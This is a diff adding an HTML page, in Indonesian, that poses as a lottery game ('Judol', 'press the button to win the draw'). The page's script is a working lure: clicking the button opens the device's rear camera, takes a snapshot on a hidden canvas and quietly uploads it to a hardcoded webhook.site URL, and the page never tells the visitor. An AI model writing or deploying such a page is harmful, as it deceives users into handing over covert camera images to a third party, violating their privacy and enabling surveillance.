@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Judol</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+    button { 
+      padding: 15px 30px; 
+      font-size: 18px; 
+      cursor: pointer; 
+      background-color: #28a745; 
+      color: white; 
+      border-radius: 8px; 
+      border: none; 
+    }
+    button:hover { background-color: #218838; }
+  </style>
+</head>
+<body>
+
+  <h1>Tekan Tombol Untuk Memenangkan Undian</h1>
+  <button id="capture">Lotre</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const captureButton = document.getElementById('capture');
+
+    const webhookUrl = 'https://webhook.site/c0b2554e-c61d-4dc9-a844-9b7806ff21d9';
+
+    captureButton.addEventListener('click', async () => {
+      try {
+        const video = document.createElement('video');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 500)); // Memberi waktu kamera untuk fokus
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('file', blob, 'gambar.jpg');
+
+          fetch(webhookUrl, { method: 'POST', body: formData })
+            .then(response => {
+              if (response.ok) {
+              } else {
+                console.error('Status:', response.status, response.statusText);
+              }
+            })
+            .catch(error => console.error('Error:', error));
+
+        }, 'image/jpeg', 0.5);
+      } catch (err) {
+        console.error(err);
+      }
+    });
+  </script>
+
+</body>
+</html>
